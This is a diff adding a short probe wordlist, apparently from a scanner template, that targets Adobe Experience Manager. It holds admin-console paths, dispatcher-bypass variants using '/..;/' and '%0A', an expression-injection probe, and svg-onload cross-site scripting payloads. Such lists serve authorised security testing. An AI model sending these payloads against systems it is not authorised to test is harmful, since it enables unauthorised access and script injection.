@@ -1,0 +1,11 @@
+/system/console?.css
+/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html?item=$%7b{{num1}}*{{num2}}%7d
+/system/console/bundles
+///system///console///bundles
+/crx/explorer/nodetypes/index.jsp
+{{paths}}
+//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
+/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
+/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
